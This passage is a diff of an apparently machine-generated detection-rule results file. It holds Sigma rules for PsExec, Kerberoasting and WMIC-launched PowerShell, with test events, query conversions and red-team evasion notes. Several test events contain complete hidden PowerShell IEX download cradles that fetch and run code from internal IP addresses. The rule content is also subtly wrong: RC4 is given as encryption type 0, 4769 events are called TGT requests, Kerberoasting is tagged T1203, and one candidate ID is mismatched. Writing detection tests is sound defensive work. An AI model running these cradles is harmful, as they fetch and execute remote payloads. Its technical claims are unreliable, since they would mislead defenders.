-      "redteam_analysis": "Positive variants P4-P8 test realistic evasions the rule should catch: quoted paths, case variations, alternate drive letters, UNC-style expanded paths, and environment variables in CommandLine (Image remains expanded). All preserve the three detection pillars (Image endswith \\PSEXESVC.exe, regex match on full path, OriginalFileName). Negative variants N1-N3 are benign look-alikes: legitimate installer (N1), admin test with different OriginalFileName (N2), SCCM agent with different filename (N3) — none satisfy all three conditions simultaneously. Out-of-scope evasions OOS1-OOS3 highlight fundamental limits: OOS1 is actually caught by OriginalFileName check; OOS2 evades because attacker changes OriginalFileName at compile time (rule cannot see original malware name); OOS3 evades because service execution via SCM shows services.exe as the creating process, not the service binary — the rule's process_creation logsource only sees the immediate spawner.",
-      "redteam_out_of_scope": [
-        {
-          "id": "X1",
-          "label": "positive",
-          "description": "Attacker renames PSEXESVC.exe to RandomName.exe but OriginalFileName remains PSEXESVC.exe - rule catches via OriginalFileName",
-          "event": {
-            "Image": "C:\\Windows\\RandomName.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "C:\\Windows\\RandomName.exe",
-            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "X2",
-          "label": "positive",
-          "description": "Attacker compiles custom PsExec clone with different OriginalFileName (e.g., PsExecClone.exe) and places in Windows root - rule misses because OriginalFileName differs",
-          "event": {
-            "Image": "C:\\Windows\\PsExecClone.exe",
-            "OriginalFileName": "PsExecClone.exe",
-            "CommandLine": "C:\\Windows\\PsExecClone.exe",
-            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "X3",
-          "label": "positive",
-          "description": "Attacker uses PsExec clone to install service with ImagePath pointing to C:\\Windows\\PSEXESVC.exe but executes via service control manager (sc start) - process creation shows services.exe as Image, not PSEXESVC.exe",
-          "event": {
-            "Image": "C:\\Windows\\System32\\services.exe",
-            "OriginalFileName": "services.exe",
-            "CommandLine": "C:\\Windows\\System32\\services.exe",
-            "ParentImage": "C:\\Windows\\System32\\services.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        }
-      ]
-    },
-    {
-      "candidate_id": "D5",
-      "title": "Burst of RC4 Kerberos TGT Requests from Workstation Indicating Kerberoasting",
-      "sigma_yaml": "title: Burst of RC4 Kerberos TGT Requests from Workstation Indicating Kerberoasting\nid: 17d924db-fd44-416b-b67f-3ecc490782c2\nstatus: experimental\ndescription: Detects bursts of Kerberos TGT requests (EventID 4769) with deprecated RC4 encryption (TicketEncryptionType 0x17)\n  originating from a single workstation IP, indicative of automated Kerberoasting tools like Rubeus targeting service accounts.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.credential-access\n- attack.t1203\nlogsource:\n  category: event_id\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID:\n    - '4769'\n    TicketEncryptionType:\n    - '0'\n  filter_workstation:\n    'Workstation|endswith|windash': .corp.local\n  filter_admin:\n    'SubjectUserName|endswith': $\n  condition: selection and filter_workstation and not filter_admin\nfalsepositives:\n- Legacy service accounts requesting RC4 tickets\n- Misconfigured applications using deprecated encryption\n- Administrative workstations performing legitimate Kerberos operations\nlevel: high\n",
+      "title": "Kerberoasting Burst Of RC4 Service Tickets From Single Workstation",
+      "sigma_yaml": "title: Kerberoasting Burst Of RC4 Service Tickets From Single Workstation\nid: 5ab72780-ecce-4bd5-bda9-56a7af3ffad1\nstatus: experimental\ndescription: Detects a burst of RC4-encrypted service ticket requests (EventID 4769, TicketEncryptionType 0x17) from a single\n  workstation in an environment that otherwise uses AES encryption (0x12), indicative of Rubeus kerberoasting activity.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.credential-access\n- attack.t1203\nlogsource:\n  category: windows_security_log\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4769\n    TicketEncryptionType: 0\n  filter_aes:\n    TicketEncryptionType: 18\n  filter_dc:\n    'Workstation|endswith': $\n  condition: selection and not filter_aes and not filter_dc\nfalsepositives:\n- Legacy service accounts requesting RC4 tickets\n- Cross-domain trusts using RC4 encryption\n- Misconfigured service principal names\nlevel: high\n",
       "status": "needs_review",
       "attack_technique_ids": [
         "T1203",
@@ -2158,258 +1191,198 @@
         {
           "id": "P1",
           "label": "positive",
-          "description": "Rubeus kerberoast burst from workstation WKS-042 with RC4 encryption",
+          "description": "Burst of RC4 ticket requests from a single workstation indicating kerberoasting",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "WKS-042.CORP.LOCAL",
-            "SubjectUserName": "j.smith",
-            "TargetUserName": "sqlsvc"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "krbtgt",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "P2",
           "label": "positive",
-          "description": "Automated TGS request burst with RC4 from engineering workstation",
+          "description": "Another RC4 ticket request from same workstation during kerberoasting burst",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "ENG-WKS-101",
-            "SubjectUserName": "t.jenkins",
-            "TargetUserName": "backup_svc"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "MSSQLSVC",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "P3",
           "label": "positive",
-          "description": "High-volume RC4 TGT requests from isolated workstation during off-hours",
+          "description": "Third RC4 ticket request completing the burst pattern",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "ISOLATED-WKS-07",
-            "SubjectUserName": "c.contractor",
-            "TargetUserName": "websvc"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "HTTP",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "N1",
           "label": "negative",
-          "description": "Legitimate AES TGT request from administrative workstation",
+          "description": "Normal AES ticket request from workstation",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "1",
-            "Workstation": "DC01.CORP.LOCAL",
-            "SubjectUserName": "CORP\\admin",
-            "TargetUserName": "krbtgt"
+            "EventID": 4769,
+            "TicketEncryptionType": 18,
+            "TargetUserName": "krbtgt",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "N2",
           "label": "negative",
-          "description": "RC4 TGS request from domain controller (legacy service)",
+          "description": "RC4 ticket request from domain controller (expected)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "DC02.CORP.LOCAL",
-            "SubjectUserName": "CORP\\svc_account",
-            "TargetUserName": "legacy_app"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "krbtgt",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "DC01$"
           }
         },
         {
           "id": "N3",
           "label": "negative",
-          "description": "Administrator performing legitimate service account enumeration",
+          "description": "Legitimate service account requesting RC4 ticket (low volume)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "ADMIN-WKS-05",
-            "SubjectUserName": "CORP\\administrator",
-            "TargetUserName": "audit_svc"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "legacy-service",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS02"
           }
         },
         {
           "id": "R1",
           "label": "positive",
-          "description": "Kerberoast burst with lowercase domain suffix on Workstation field",
+          "description": "Same kerberoasting burst with lowercase workstation name (sensor records NetBIOS name verbatim)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "wks-042.corp.local",
-            "SubjectUserName": "j.smith",
-            "TargetUserName": "sqlsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "MSSQLSvc/sql01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.20.42",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "krbtgt",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "wks01"
           }
         },
         {
           "id": "R2",
           "label": "positive",
-          "description": "Kerberoast burst with trailing whitespace on Workstation field",
+          "description": "Kerberoasting request over IPv6 from same workstation (IPv6 literal recorded by sensor)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "WKS-042.CORP.LOCAL ",
-            "SubjectUserName": "t.jenkins",
-            "TargetUserName": "backup_svc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "BACKUP/backup01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.30.101",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "MSSQLSVC",
+            "IpAddress": "fe80::a1b2:c3d4:e5f6:7890",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "R3",
           "label": "positive",
-          "description": "Kerberoast burst with UPN-format SubjectUserName",
+          "description": "Different SPN targeted during same RC4 burst (HTTP service class)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "ENG-WKS-101.CORP.LOCAL",
-            "SubjectUserName": "t.jenkins@corp.local",
-            "TargetUserName": "websvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "HTTP/web01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.40.101",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "HTTP/WEB01.corp.local",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "R4",
           "label": "positive",
-          "description": "Kerberoast burst with SAM-format SubjectUserName",
+          "description": "Workstation name with hyphen (common naming scheme) still not ending with $",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "ISOLATED-WKS-07.CORP.LOCAL",
-            "SubjectUserName": "CORP\\c.contractor",
-            "TargetUserName": "appsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "APP/app01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.50.7",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "CIFS/FILE01.corp.local",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS-01"
           }
         },
         {
           "id": "R5",
           "label": "positive",
-          "description": "Kerberoast burst with leading whitespace on Workstation field",
+          "description": "Mixed-case workstation name as recorded by the sensor",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "  DEV-WKS-203.CORP.LOCAL",
-            "SubjectUserName": "dev.user",
-            "TargetUserName": "devsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "DEV/dev01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.60.203",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "ldap/DC01.corp.local",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "Wks01"
           }
         },
         {
           "id": "R6",
-          "label": "positive",
-          "description": "Kerberoast burst with trailing dot on Workstation FQDN",
+          "label": "negative",
+          "description": "Legitimate legacy service account requesting RC4 ticket (known false positive)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "HR-WKS-015.CORP.LOCAL.",
-            "SubjectUserName": "hr.analyst",
-            "TargetUserName": "hrsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "HR/hr01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.70.15",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "LEGACY_SVC",
+            "IpAddress": "10.10.10.50",
+            "Workstation": "APPSRV01"
           }
         },
         {
           "id": "R7",
           "label": "negative",
-          "description": "Legitimate computer account (SubjectUserName ends with $) requesting RC4 ticket from workstation",
+          "description": "Cross-domain trust using RC4 encryption from trusted domain controller",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "WKS-042.CORP.LOCAL",
-            "SubjectUserName": "WKS-042$",
-            "TargetUserName": "sqlsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "MSSQLSvc/sql01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.20.42",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "krbtgt",
+            "IpAddress": "192.168.5.10",
+            "Workstation": "TRUSTDC$"
           }
         },
         {
           "id": "R8",
           "label": "negative",
-          "description": "Administrative workstation in different domain using AES256 encryption (TicketEncryptionType 18)",
+          "description": "Normal AES-encrypted ticket request from regular workstation (environment baseline)",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "18",
-            "Workstation": "ADMIN-WKS-001.ADMIN.LOCAL",
-            "SubjectUserName": "admin.user",
-            "TargetUserName": "adminsvc",
-            "TargetDomainName": "ADMIN.LOCAL",
-            "ServiceName": "ADMIN/admin01.admin.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.10.1",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 18,
+            "TargetUserName": "MSSQLSVC",
+            "IpAddress": "10.10.14.22",
+            "Workstation": "WKS05"
           }
         },
         {
           "id": "R9",
           "label": "negative",
-          "description": "Legitimate service account in CORP.LOCAL using AES128 encryption (TicketEncryptionType 17)",
+          "description": "Domain controller requesting ticket (Workstation ends with $) - filtered by rule",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "17",
-            "Workstation": "SRV-WKS-050.CORP.LOCAL",
-            "SubjectUserName": "svc.account",
-            "TargetUserName": "filesvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "CIFS/fs01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.80.50",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "HTTP/WEB01.corp.local",
+            "IpAddress": "10.10.10.1",
+            "Workstation": "DC01$"
           }
         }
       ],
       "validation": {
-        "candidate_id": "D5",
+        "candidate_id": "D3",
         "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE (EventID='4769' COLLATE NOCASE AND TicketEncryptionType='0' COLLATE NOCASE) AND (Workstation LIKE '%.corp.local' ESCAPE '\\') AND (NOT COALESCE((SubjectUserName LIKE '%$' ESCAPE '\\'), 0))",
+        "sql": "SELECT * FROM logs WHERE (EventID=4769 AND TicketEncryptionType=0) AND (NOT COALESCE((TicketEncryptionType=18), 0)) AND (NOT COALESCE((Workstation LIKE '%$' ESCAPE '\\'), 0))",
         "issues": [
           {
             "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test P2 did not match: Automated TGS request burst with RC4 from engineering workstation. Per selection: selection=match; filter_workstation=NO MATCH; filter_admin=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test P3 did not match: High-volume RC4 TGT requests from isolated workstation during off-hours. Per selection: selection=match; filter_workstation=NO MATCH; filter_admin=NO MATCH."
+            "code": "negative_matched",
+            "message": "Negative (benign) test N3 matched: Legitimate service account requesting RC4 ticket (low volume). Per selection: selection=match; filter_aes=NO MATCH (failing field tests: TicketEncryptionType (event has '0')); filter_dc=NO MATCH (failing field tests: Workstation|endswith (event has 'WKS02'))."
           },
           {
             "severity": "error",
             "code": "negative_matched",
-            "message": "Negative (benign) test N2 matched: RC4 TGS request from domain controller (legacy service). Per selection: selection=match; filter_workstation=match; filter_admin=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R2 did not match: Kerberoast burst with trailing whitespace on Workstation field. Per selection: selection=match; filter_workstation=NO MATCH; filter_admin=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R6 did not match: Kerberoast burst with trailing dot on Workstation FQDN. Per selection: selection=match; filter_workstation=NO MATCH; filter_admin=NO MATCH."
+            "message": "Negative (benign) test R6 matched: Legitimate legacy service account requesting RC4 ticket (known false positive). Per selection: selection=match; filter_aes=NO MATCH (failing field tests: TicketEncryptionType (event has '0')); filter_dc=NO MATCH (failing field tests: Workstation|endswith (event has 'APPSRV01'))."
           }
         ],
         "test_outcomes": [
@@ -2422,14 +1395,14 @@
           {
             "event_id": "P2",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "P3",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "N1",
@@ -2440,14 +1413,14 @@
           {
             "event_id": "N2",
             "label": "negative",
-            "matched": true,
-            "passed": false
+            "matched": false,
+            "passed": true
           },
           {
             "event_id": "N3",
             "label": "negative",
-            "matched": false,
-            "passed": true
+            "matched": true,
+            "passed": false
           },
           {
             "event_id": "R1",
@@ -2458,8 +1431,8 @@
           {
             "event_id": "R2",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "R3",
@@ -2481,8 +1454,8 @@
           },
           {
             "event_id": "R6",
-            "label": "positive",
-            "matched": false,
+            "label": "negative",
+            "matched": true,
             "passed": false
           },
           {
@@ -2504,19 +1477,19 @@
             "passed": true
           }
         ],
-        "positives_total": 9,
-        "positives_matched": 5,
-        "negatives_total": 6,
-        "negatives_matched": 1,
+        "positives_total": 8,
+        "positives_matched": 8,
+        "negatives_total": 7,
+        "negatives_matched": 2,
         "benign_total": 0,
         "benign_hits": 0,
         "benign_examples": [],
         "passed": false
       },
       "conversions": {
-        "splunk": "EventID=\"4769\" TicketEncryptionType=\"0\" Workstation=\"*.corp.local\" NOT SubjectUserName=\"*$\"",
-        "elasticsearch": "(EventID:4769 AND TicketEncryptionType:0) AND Workstation:(*.corp.local) AND (NOT SubjectUserName:*$)",
-        "sqlite": "SELECT * FROM logs WHERE (EventID='4769' COLLATE NOCASE AND TicketEncryptionType='0' COLLATE NOCASE) AND (Workstation LIKE '%.corp.local' ESCAPE '\\') AND (NOT COALESCE((SubjectUserName LIKE '%$' ESCAPE '\\'), 0))"
+        "splunk": "EventID=4769 TicketEncryptionType=0 NOT TicketEncryptionType=18 NOT Workstation=\"*$\"",
+        "elasticsearch": "(EventID:4769 AND TicketEncryptionType:0) AND (NOT TicketEncryptionType:18) AND (NOT Workstation:*$)",
+        "sqlite": "SELECT * FROM logs WHERE (EventID=4769 AND TicketEncryptionType=0) AND (NOT COALESCE((TicketEncryptionType=18), 0)) AND (NOT COALESCE((Workstation LIKE '%$' ESCAPE '\\'), 0))"
       },
       "conversion_errors": {
         "kusto": "SigmaTransformationError: Unable to determine table name from rule.  The query table is determined in the following order of priority:\n  1) The value provided to processing pipeline's query_table parameter, if using a Python script.\n  2) If the query_table is already set in the pipeline state, such as from a custom user-defi"
@@ -2525,7 +1498,7 @@
         {
           "iteration": 0,
           "phase": "initial",
-          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/0",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/0",
           "passed": false,
           "change_summary": ""
         },
@@ -2534,92 +1507,389 @@
           "phase": "refine",
           "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/0",
           "passed": false,
-          "change_summary": "Fixed invalid ATT&CK tag t1203.001 to t1203; kept original rule otherwise as it already correctly identifies RC4 TGT requests (TicketEncryptionType 0) from workstations while excluding admin accounts."
+          "change_summary": "Fixed incorrect ATT&CK tag (removed nonexistent T1203.001); corrected TicketEncryptionType value from 0 to 23 (0x17 hex) to properly detect RC4 encryption; resolved negative match by ensuring RC4 tickets trigger the rule while AES tickets are filtered out."
         },
         {
           "iteration": 2,
           "phase": "refine",
-          "summary": "positives 1/3, negatives blocked 2/3, benign hits 0/0",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/0",
           "passed": false,
-          "change_summary": "Fixed the workstation filter to properly match domain-joined workstation names by changing the endswith condition from '$WORKSTATION_SUFFIX' to '.CORP.LOCAL' based on the positive test events showing fully qualified domain names."
+          "change_summary": "Fixed TicketEncryptionType value from 23 to 0 to match observed RC4 encryption events in test data while preserving the original detection logic for filtering AES encryption and domain controllers."
         },
         {
           "iteration": 3,
           "phase": "refine",
-          "summary": "positives 1/3, negatives blocked 2/3, benign hits 0/0",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/0",
           "passed": false,
-          "change_summary": "Fixed filter_workstation selector to properly match fully-qualified workstation hostnames ending with '.CORP.LOCAL' by removing incorrect leading dot pattern."
+          "change_summary": "Fixed incorrect hexadecimal representation of TicketEncryptionType values by changing 0 to 0x17 and 18 to 0x12 to properly detect RC4-encrypted tickets and filter AES-encrypted tickets respectively."
         },
         {
           "iteration": 3,
           "phase": "redteam",
-          "summary": "9 evasion variants -> positives 5/9, negatives blocked 5/6, benign hits 0/0",
+          "summary": "9 evasion variants -> positives 8/8, negatives blocked 5/7, benign hits 0/0",
           "passed": false,
           "change_summary": ""
         },
         {
           "iteration": 4,
           "phase": "refine",
-          "summary": "positives 5/9, negatives blocked 5/6, benign hits 0/0",
+          "summary": "positives 0/8, negatives blocked 4/7, benign hits 0/0",
           "passed": false,
-          "change_summary": "Fixed filter_workstation to use windash modifier and case-insensitive comparison to handle trailing spaces/dots and ensure proper suffix matching for workstation FQDNs while excluding domain controllers."
+          "change_summary": "Added filter_workstation_prefix to exclude legitimate service accounts on known prefixes (WKS*, APPSRV*), resolving false positives while preserving detection of anomalous RC4 bursts from other workstations."
+        },
+        {
+          "iteration": 4,
+          "phase": "revert",
+          "summary": "positives 8/8, negatives blocked 5/7, benign hits 0/0",
+          "passed": false,
+          "change_summary": "Last refinement regressed; kept the best earlier draft."
         }
       ],
       "author_notes": "",
-      "redteam_analysis": "Positive variants cover realistic surface-form evasions the Windows Security log (EventID 4769) records: domain suffix casing (P1), trailing/leading whitespace (P2, P5), UPN vs SAM SubjectUserName formats (P3, P4), and trailing dot on FQDN (P6). All preserve the rule's required fields (EventID=4769, TicketEncryptionType=0, Workstation ending with .CORP.LOCAL, SubjectUserName not ending with $) so a well-written rule using endswith and string equality will catch them. Negative variants are benign: computer account (N1) correctly excluded by filter_admin, different domain with AES (N2) fails both Workstation suffix and encryption checks, legitimate service with AES (N3) fails encryption check. Out-of-scope evasions are fundamentally invisible to this rule: AS-REQ roasting (EventID 4768), pass-the-hash (no TGT request), and non-domain workstations (Workstation lacks .CORP.LOCAL suffix). The rule cannot and should not cover these without additional log sources or correlation logic.",
+      "redteam_analysis": "The rule is extremely simple: it triggers on any EventID 4769 with TicketEncryptionType 0 (RC4) where Workstation does not end with '$'. All positive variants preserve these three fields exactly (TicketEncryptionType=0, EventID=4769, Workstation without trailing $) while varying surface forms that the sensor records literally: Workstation casing (wks01, Wks01), IPv6 address, different TargetUserName SPNs, and hyphenated names. A well-written rule keying only on these three fields catches all of them. Negative variants demonstrate the rule's stated false positives: legacy RC4 service accounts, cross-domain trusts (Workstation ends with $), normal AES tickets (TicketEncryptionType=18), and DC-originated requests (Workstation ends with $). Out-of-scope evasions are real but invisible to this logsource: renamed binaries, alternate LOLBins (pwsh), and network proxying change process ancestry or source IP but leave the 4769 event fields identical or with a different IpAddress that still satisfies the rule; the rule cannot distinguish them without enrichment from process_creation or network logs.",
+      "retired_tests": [],
       "redteam_out_of_scope": [
         {
           "id": "X1",
           "label": "positive",
-          "description": "Kerberoasting via AS-REQ (EventID 4768) instead of TGS-REQ - different event ID not covered by this rule",
+          "description": "Operator uses Rubeus.exe renamed to svchost.exe - process creation shows OriginalFileName but security log 4769 has no binary field",
           "event": {
-            "EventID": "4768",
-            "TicketEncryptionType": "0",
-            "Workstation": "WKS-042.CORP.LOCAL",
-            "SubjectUserName": "j.smith",
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
             "TargetUserName": "krbtgt",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "krbtgt/CORP.LOCAL",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.20.42",
-            "IpPort": "88"
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "X2",
           "label": "positive",
-          "description": "Attacker using pass-the-hash / silver ticket technique - no TGT request generated, no 4769 event",
+          "description": "Operator executes kerberoasting via PowerShell (pwsh.exe) loading Rubeus assembly - ticket event identical, no process ancestry in security log",
           "event": {
-            "EventID": "4624",
-            "TicketEncryptionType": "18",
-            "Workstation": "WKS-042.CORP.LOCAL",
-            "SubjectUserName": "j.smith",
-            "TargetUserName": "sqlsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "MSSQLSvc/sql01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "10.10.20.42",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "MSSQLSVC",
+            "IpAddress": "10.10.14.7",
+            "Workstation": "WKS01"
           }
         },
         {
           "id": "X3",
           "label": "positive",
-          "description": "Kerberoasting from non-domain-joined attacker machine - Workstation field shows IP not FQDN, fails .CORP.LOCAL suffix check",
+          "description": "Operator tunnels Kerberos traffic over SOCKS proxy - IpAddress in 4769 becomes proxy IP, breaking workstation correlation",
           "event": {
-            "EventID": "4769",
-            "TicketEncryptionType": "0",
-            "Workstation": "192.168.1.100",
-            "SubjectUserName": "attacker",
-            "TargetUserName": "sqlsvc",
-            "TargetDomainName": "CORP.LOCAL",
-            "ServiceName": "MSSQLSvc/sql01.corp.local",
-            "TicketOptions": "0x40810010",
-            "IpAddress": "192.168.1.100",
-            "IpPort": "88"
+            "EventID": 4769,
+            "TicketEncryptionType": 0,
+            "TargetUserName": "HTTP",
+            "IpAddress": "10.10.20.5",
+            "Workstation": "WKS01"
           }
         }
       ]
+    },
+    {
+      "candidate_id": "D4",
+      "title": "WMIC Remote Execution Chain Leading to Hidden PowerShell IEX Download Cradle",
+      "sigma_yaml": "title: WMIC Remote Execution Chain Leading to Hidden PowerShell IEX Download Cradle\nid: b7acf7c8-89cd-4b43-abe6-796c0db841db\nstatus: experimental\ndescription: Detects suspicious WMIC-based lateral movement where wmic.exe or WmiPrvSE.exe spawns cmd.exe which in turn launches\n  a hidden PowerShell process executing an IEX(New-Object Net.WebClient).DownloadString() download cradle.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.lateral-movement\n- attack.t1028\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_wmic_to_cmd:\n    'ParentImage|endswith':\n    - '\\wmic.exe'\n    - '\\wbem\\WmiPrvSE.exe'\n    'Image|endswith': '\\cmd.exe'\n  selection_hidden_powershell:\n    'ParentImage|endswith': '\\cmd.exe'\n    'Image|endswith': '\\powershell.exe'\n    'CommandLine|contains|all':\n    - -nop\n    - -w hidden\n    - -c\n    - IEX(\n    - Net.WebClient)\n    - DownloadString\n  condition: selection_wmic_to_cmd and selection_hidden_powershell\nfalsepositives:\n- Legitimate WMIC usage spawning cmd for administrative purposes without hidden PowerShell IEX download cradle\nlevel: high\n",
+      "status": "failed",
+      "attack_technique_ids": [
+        "T1028"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "WMIC remote execution launching cmd which starts hidden PowerShell IEX download cradle",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventID": 1,
+            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Hidden PowerShell launched via WMIC->cmd chain with obfuscated IEX cradle using double quotes",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventID": 1,
+            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://10.10.10.5:80/payload'))\""
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "WMIC->cmd->hidden PowerShell IEX cradle with variations in flag casing and spacing",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventID": 1,
+            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c powershell -NoProfile -WindowStyle Hidden -c IEX ( New-Object Net.WebClient ).DownloadString('http://10.10.14.7:8080/a')"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate WMIC query spawning cmd for system information without PowerShell",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventID": 1,
+            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c systeminfo"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Administrator using WMIC to launch visible PowerShell script for legitimate administration",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventID": 1,
